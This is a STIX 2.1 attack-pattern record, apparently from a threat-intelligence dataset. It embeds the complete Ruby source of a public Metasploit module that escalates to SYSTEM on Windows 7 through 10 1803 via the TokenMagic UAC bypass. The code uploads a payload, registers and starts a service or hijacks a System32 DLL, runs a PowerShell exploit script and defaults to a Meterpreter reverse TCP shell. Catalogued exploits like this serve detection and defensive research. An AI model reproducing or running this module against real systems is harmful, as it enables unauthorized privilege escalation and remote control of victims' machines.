{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e03d4385-c18a-4ea8-8246-01aac96071b5",
    "created": "2024-08-14T16:50:09.307709Z",
    "modified": "2024-08-14T16:50:09.307712Z",
    "name": "Windows Privilege Escalation via TokenMagic (UAC Bypass)",
    "description": " This module leverages a UAC bypass (TokenMagic) in order to spawn a process/conduct a DLL hijacking attack to gain SYSTEM-level privileges. Windows 7 through Windows 10 1803 are affected.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/tokenmagic.rb",
            "external_id": "tokenmagic.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1"
        },
        {
            "source_name": "reference",
            "url": "https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-1.html"
        },
        {
            "source_name": "reference",
            "url": "https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-2.html"
        },
        {
            "source_name": "reference",
            "url": "https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-3.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE # Needed for generate_payload_dll\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n  include Msf::Post::Windows::FileSystem\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::Powershell\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Privilege Escalation via TokenMagic (UAC Bypass)',\n        'Description' => %q{\n          This module leverages a UAC bypass (TokenMagic) in order to spawn a process/conduct a DLL\n          hijacking attack to gain SYSTEM-level privileges. Windows 7 through Windows 10 1803\n          are affected.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'James Forshaw', # Research\n          'Ruben Boonen (@FuzzySec)', # PoC\n          'bwatters-r7', # msf module\n          'jheysel-r7' # msf module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          [ 'Automatic', { 'Arch' => [ ARCH_X86, ARCH_X64 ] } ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2017-05-25',\n        'References' => [\n          ['URL', 'https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1'],\n          ['URL', 'https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-1.html'],\n          ['URL', 'https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-2.html'],\n          ['URL', 'https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-3.html']\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ],\n          'Reliability' => [REPEATABLE_SESSION]\n        },\n        'DefaultOptions' => {\n          'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',\n          'WfsDelay' => 900\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              powershell_execute\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('SERVICE_NAME',\n                    [false, 'Service Name to use (Random by default).', Rex::Text.rand_text_alpha(5..9)]),\n      OptString.new('WRITABLE_DIR',\n                    [false, 'Directory to write file to (%TEMP% by default).', nil]),\n      OptString.new('SERVICE_FILENAME',\n                    [false, 'Filename for Service Payload (Random by default).', Rex::Text.rand_text_alpha(5..9)]),\n      OptEnum.new('METHOD',\n                  [\n                    true, 'SERVICE or DLL, please select which attack method you would like to use (SERVICE by default).\nNote that the System Orchestrator service which loads the overwritten DLL when using the DLL method can take up to 10\nminutes to trigger', 'SERVICE', ['SERVICE', 'DLL']\n                  ])\n    ])\n  end\n\n  def launch_dll_trigger\n    if sysinfo['Architecture'] == ARCH_X64\n      library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'uso_trigger', 'uso_trigger.x64.dll')\n    elsif sysinfo['Architecture'] == ARCH_X86\n      library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'uso_trigger', 'uso_trigger.x86.dll')\n    end\n\n    print_status('Reflectively injecting exploit DLL into a spare process and triggering the LPE...')\n    encoded_payload = payload.encoded\n    execute_dll(library_path, encoded_payload)\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog(e)\n    print_error(e.message)\n  end\n\n  def payload_arch\n    payload.arch.include?(ARCH_X64) ? ARCH_X64 : ARCH_X86\n  end\n\n  def exploit\n    win_dir = session.sys.config.getenv('windir')\n    cmd_path = \"#{win_dir}\\\\system32\\\\cmd.exe\"\n    service_filename = datastore['SERVICE_FILENAME'] || Rex::Text.rand_text_alpha(5..9)\n    service_filename = \"#{service_filename}.exe\" unless service_filename.end_with?('.exe')\n    service_name = datastore['SERVICE_NAME'] || Rex::Text.rand_text_alpha(5..9)\n    writable_dir = datastore['WRITABLE_DIR'] || session.sys.config.getenv('TEMP')\n\n    # Check target\n    validate_active_host\n    validate_payload\n\n    if datastore['METHOD'] =~ /DLL/i\n      bin_path = \"#{writable_dir}\\\\WindowsCoreDeviceInfo.dll\"\n      payload = generate_payload_dll\n      vprint_status(\"Payload DLL is #{payload.length} bytes long\")\n      client.core.use('powershell') unless client.ext.aliases.include?('powershell')\n      register_file_for_cleanup('C:\\\\Windows\\\\System32\\\\WindowsCoreDeviceInfo.dll') # Register this file for cleanup so that if we fail, then the file is cleaned up.\n      # Replace Value in Generic Script.\n      cmd_args = \"/c move #{bin_path} C:\\\\Windows\\\\System32\\\\WindowsCoreDeviceInfo.dll\"\n    else\n      bin_path = \"#{writable_dir}\\\\#{service_filename}\"\n      payload = generate_payload_exe_service({ servicename: service_name, arch: payload_arch })\n      vprint_status(\"Service Name = #{service_name}\")\n      client.core.use('powershell') unless client.ext.aliases.include?('powershell')\n      # Replace Value in Generic Script. Note Windows 7 requires spaces after the equal signs in the below command.\n      cmd_args = \"/c sc create #{service_name} binPath= #{bin_path} type= own start= demand && sc start #{service_name}\"\n    end\n\n    # Upload the payload\n    print_status(\"Uploading payload to #{bin_path}\")\n    write_file(bin_path, payload)\n    register_file_for_cleanup(bin_path)\n\n    # Read in Generic Script\n    script = exploit_data('tokenmagic', 'tokenmagic.ps1')\n    script.gsub!('_CMD_PATH_', cmd_path)\n    script.gsub!('_CMD_ARGS_', cmd_args)\n\n    # Run Exploit Script\n    print_status(\"Running Exploit on #{sysinfo['Computer']}\")\n    begin\n      print_status('Executing TokenMagic PowerShell script')\n      session.powershell.execute_string({ code: script })\n    rescue Rex::TimeoutError => e\n      elog('Caught timeout. Exploit may be taking longer or it may have failed.', error: e)\n      print_error('Caught timeout. Exploit may be taking longer or it may have failed.')\n    end\n\n    if datastore['METHOD'] =~ /DLL/i\n      launch_dll_trigger\n      print_status(\"Note that the System Orchestrator service which loads the overwritten DLL when using the DLL method can take up to 10\nminutes to trigger and recieve a shell.\")\n    end\n    print_good('Enjoy the shell!')\n  end\n\n  def validate_active_host\n    print_status(\"Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}\")\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog('Could not connect to session', error: e)\n    raise Msf::Exploit::Failed, 'Could not connect to session'\n  end\n\n  def validate_payload\n    vprint_status(\"Target Arch = #{sysinfo['Architecture']}\")\n    vprint_status(\"Payload Arch = #{payload.arch.first}\")\n    unless payload.arch.first == sysinfo['Architecture']\n      fail_with(Failure::NoTarget, 'Payload arch must match target arch')\n    end\n  end\n\n  def check\n    version = get_version_info\n\n    vprint_status(\"OS: #{version.product_name}\")\n    # Service method has been tested on Windows 7, 8 and 10 (1803 and ealier)\n    vulnerable_to_service = version.build_number.between?(Msf::WindowsVersion::Win7_SP1, Msf::WindowsVersion::Win10_1803)\n    if datastore['METHOD'] =~ /service/i\n      return Exploit::CheckCode::Appears if vulnerable_to_service\n    elsif version.build_number.between?(Msf::WindowsVersion::Win10_1703, Msf::WindowsVersion::Win10_1803)\n      # DLL method has been tested on Windows 10 (1703 to 1803)\n      return Exploit::CheckCode::Appears\n    elsif datastore['METHOD'] =~ /dll/i && vulnerable_to_service\n      print_error(\"The current target is not vulnerable to the DLL hijacking technique. Please try setting METHOD to 'SERVICE' and then try again!\")\n    end\n    Exploit::CheckCode::Safe\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-05-25",
    "x_mitre_platforms": [
        "['win']"
    ]
}